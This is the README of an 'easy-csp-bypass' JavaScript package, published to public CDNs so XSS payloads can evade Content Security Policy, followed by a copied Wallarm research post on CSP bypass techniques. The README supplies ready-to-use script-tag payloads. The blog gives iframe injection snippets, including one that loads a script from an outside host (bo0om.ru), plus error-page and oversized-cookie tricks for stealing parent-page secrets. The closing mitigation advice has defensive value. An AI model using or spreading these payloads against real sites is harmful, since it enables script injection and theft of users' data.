# easy-csp-bypass

Just a fun project to see if this code can end up in some CDN, so it would be easier to exploit XSS with CSP.

## How to use ?

Well, it depends.
If you are lucky enough to find unsafe-eval in the CSP configuration, you can use those scenario:

- Classic => /dist/classic.js
- Classic-infinite => /dist/classic-infinite.js
- Url => /dist/url.js

If you can't use eval() because unsafe-eval is not in the configuration, well it's not over !!
I found a Javascript interpreter called [sval](https://github.com/Siubaak/sval).
It can easily bypass the unsafe-eval restriction :) !

- Classic => /dist/sval-classic.js
- Classic-infinite => /dist/sval-infinite.js
- Url => /dist/sval-url.js

## Example

If you have an XSS on a website with CSP, search in the directive 'script-src' for [unpkg.com](https://unpkg.com/) or [jsdeliver](https://www.jsdelivr.com/).
If these domain are whitelist, you win !

```html
  <script src="https://unpkg.com/csp-bypass@1.0.2-0/dist/classic.js"></script>
  <br csp="alert(1)">
```

if 'unsafe-eval' is missing use the sval one:

```html
  <script src="https://unpkg.com/csp-bypass@1.0.2-0/dist/sval-classic.js"></script>
  <br csp="alert(1)">
```


##
#
https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/
#
##


 Neatly bypassing CSP
July 10, 2018 8 Mins Read
bypassing csp	
How to trick CSP in letting you run whatever you want

By bo0om, Wallarm research

Content Security Policy or CSP is a built-in browser technology which helps protect from attacks such as cross-site scripting (XSS). It lists and describes paths and sources, from which the browser can safely load resources. The resources may include images, frames, javascript and more.

But what if we can give an example of successful XSS attacks when no unsafe resource origins are allowed? Read on to find out how.
How CSP works when everything is well.

A common usage scenario here is when CSP specifies that the images can only be loaded from the current domain, which means that all the tags with external domains will be ignored.

Content Security Policy is commonly used to block untrusted JS and minimize the chance of a successful XSS attack.

Here is an example of allowing resource from the local domain (self) to be loaded and executed in-line:

Content-Security-Policy: default-src ‘self’ ‘unsafe-inline’;

Since a security policy implies “prohibited unless explicitly allowed”, this configuration prohibits usage of any functions that execute code transmitted as a string. For example: eval, setTimeout, setInterval will all be blocked because of the setting unsafe-eval
How CSP works

Any content from external sources is also blocked, including images, css, websockets, and, especially, JS

To see for yourself how it works, check out this code where I deliberately put in a XSS attack. Try to steal the secret this way without spooking the user, i.e. without a redirect.
Tricking CSP

Despite the limitations, we can still upload scenarios, create frames and put together images because self does not prevent working with the resources governed by Self Origin Policy (SOP). Since CSP also applies to frames, the same policy governs frames that may include data, blob or files formed with srcdoc as protocols.
Tricking CSP 1

So, can we really execute an arbitrary javascript in a test file? The truth is out there.

We are going to rely on a neat tick here. Most of the modern browser automatically convert files, such as text files or images, to an HTML page.
Tricking CSP 2

The reason for this behavior is to correctly depict the content in the browser window; it needs to have the right background, be centered and so on. However, iframe is also a browser window!. Thus, opening any file that needs to shown in a browser in an iframe (i.e. favicon.ico or robots.txt) will immediately convert them into HTML without any data validation as long as the content-type is right.

What happens if a frame opens a site page that doesn’t have a CSP header? You can guess the answer. Without CSP, an open frame will execute all the JS inside the page. If the page has an XSS exploit, we can write a js into the frame ourselves.

To test this, let’s try a scenario which opens an iframe. Let’s use bootstrap.min.css, which we already mentioned earlier, as an example.

frame=document.createElement(“iframe”);
frame.src=”/css/bootstrap.min.css”;
document.body.appendChild(frame);

Tricking CSP 3

Let’s take a look at what’s in the frame. As expected, CSS got converted into HTML and we managed to overwrite the content of head (even though it was empty to begin with). Now, let’s see if we can get it to suck in an external JS file.

script=document.createElement(‘script’);
script.src=’//bo0om.ru/csp.js’;
window.frames[0].document.head.appendChild(script);

Tricking CSP 4

It worked! this is how we can execute an injecting through an iframe, create our own js scenario and query the parent window to steal its data.

All you need for an XSS attack is to open an iframe and pointed it at any path that doesn’t include a CSP header. It can be the standard favicon.ico, robots.txt, sitemap.xml, css/js, jpg or other files.

PoC
API Security Checklist
Not sure where you stand with API security? The checklist can serve as a starting point for Engineering and Security teams looking to keep APIs compliant and secure.
Download free checklist
Slight of hand and no magic

What if the site developer was careful and any expected site response (200-OK) includes X-Frame-Options: Deny? We can still try to get in. The second common error in using CSP is a lack of protective headers when returning web scanner errors. The simplest way to try this is to try to open a web page that doesn’t exist. I noticed that many resources only include X-Frame-Options on response with 200 code and not with 404 code.

If that is also accounted for, we can try causing the site to return a standard web-server “invalid request” message.

For example, force NGINX to return “400 bad request”, all you need to do is to query on level above it at /../ To prevent the browser from normalizing the request and replacing /../ with /, we will use unicode for the dots and the last slash.

frame=document.createElement(“iframe”);
frame.src=”/%2e%2e%2f”;
document.body.appendChild(frame);

Tricking CSP 5

Another possibility here is passing and incorrect unicode path, i.e. /% or /%%z

However, the easiest way to get a web-server to return an error is to exceed the URL allowed length. Most modern browsers can concoct a url which is much much longer than a web-server can handle. A standard default url length handled by such web-servers and NGINX & Apache is set not to exceed 8kB.

To try that, we can execute a similar scenario with a path length of 20000 byte:

frame=document.createElement(“iframe”);
frame.src=”/”+”A”.repeat(20000);
document.body.appendChild(frame);

Tricking CSP 6

Yet another way to fool the server into returning an error is to trigger a cookie length limit. Again, browsers support more and longer cookies than web-servers can handle. Following the same scenario:

    Create a humongous cookie
    for(var i=0;i<5;i++){document.cookie=i+”=”+”a”.repeat(4000)};

2. Open an iframe using any address, which will cause the server to return an error (often without XFO or CSP)

3. Remove the humongous cookie:
for(var i=0;i<5;i++){document.cookie=i+”=”}

4. Write your own js script into the frame that steals the parent’s secret

Try it for yourself. Here are some hints for you if you need them: PoC 🙂

There are many other ways to cause the web-server to return an error, for example, we can send a POST request which is too long or cause the web-server 500 error somehow.
Enjoy Free API Security with Wallarm up to 500K Requests per month
Sign up for free
Why is CSP so gullible and what to do about it?

The simple underlying reason is that the policy controlling the resource is embedded within the resource itself.

To avoid bad situations, my recommendations are:

    CSP headers should be present on all the pages, event on the error pages returned by the web-server.
    CSP options should be configured to restrict the rights to just those necessary to work with the specific resource. Try setting Content-Security-Policy-Report-Only: default-src ‘none’ and gradually adding permission rules for specific use cases.

If you have to use unsafe-inline for correctly loading and processing the resources, your only protection is to use nonce or hash-source. Otherwise, you are exposed to XSS attacks and if CSP doesn’t protect, why do you need it in the first place ?!

Additionally, as shared by @majorisc, another trick for stealing the data from a page is to use RTCPeerConnection and to pass the secret via DNS requests. default-src ‘self’ doesn’t protect from it, unfortunately.

Keep reading our blog for more tricks from our magic bag. Visit our website to learn more about the next generation of web application security such as the API Security Platform.

Frequently Asked Questions

What is Content-Security-Policy?
Content-Security-Policy (CSP) is an HTTP response header that helps to prevent cross-site scripting (XSS) attacks by specifying which sources of content are allowed to be loaded on a web page.

Is Content-Security-Policy necessary?
Yes, CSP plays a crucial role in the web security landscape. It helps to mitigate XSS attacks and keeps users safe from malicious content. Using CSP is especially important for websites that collect sensitive information from users.

Can you bypass Content-Security-Policy?
It is possible to bypass CSP by using various techniques like inline/eval code injection, data: URI scheme, or simply by using an XSS attack. However, such practices are considered malicious and can put user data at risk.

What is content security bypass?
A content security bypass is a security vulnerability that allows an attacker to bypass the Content-Security-Policy (CSP) header. This could potentially allow a hacker to inject malicious content into a website.

How do I get rid of content security policy?
It is not recommended to remove Content-Security-Policy (CSP) as it is an important security measure that protects your website. However, if you need to remove CSP for some reason, you can do so by modifying the HTTP response header of the web server.

References

XXE that can Bypass WAF Protection

Latest Bypassing Techniques Beat SOAP/XML API Protection

Grammarly fixed XSS vulnerability that bypasses AWS WAF
